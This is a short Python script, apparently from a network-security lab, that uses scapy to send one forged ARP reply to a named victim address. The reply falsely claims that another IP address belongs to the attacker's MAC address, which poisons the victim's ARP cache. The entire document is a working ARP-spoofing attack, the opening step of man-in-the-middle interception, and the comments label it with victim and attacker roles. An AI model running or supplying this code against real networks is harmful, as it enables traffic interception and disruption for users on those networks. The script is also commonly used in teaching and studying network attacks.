from scapy.all import ARP, send

target_ip = "172.30.0.4"         # victim IP  
target_mac = "de:5c:e3:e5:6c:eb" # victim MAC
spoof_ip = "172.30.0.2"          # IP address to spoof
my_mac = "de:ad:be:ef:00:05"     # Attacker's MAC address


packet = ARP(op=2,                # 2 = is-at (ARP reply)
          psrc=spoof_ip,       # Claimed source IP (attacker's or another IP you want to spoof)
          hwsrc=my_mac,        # Claimed source MAC (attacker's or a fake MAC you want to use)
          pdst=target_ip,      # Target IP (victim IP)
          hwdst=target_mac     # Target MAC (victim MAC, since it should be unicast)
    )

#print(packet.show())
send(packet, verbose=False)

print("ARP reply sent.")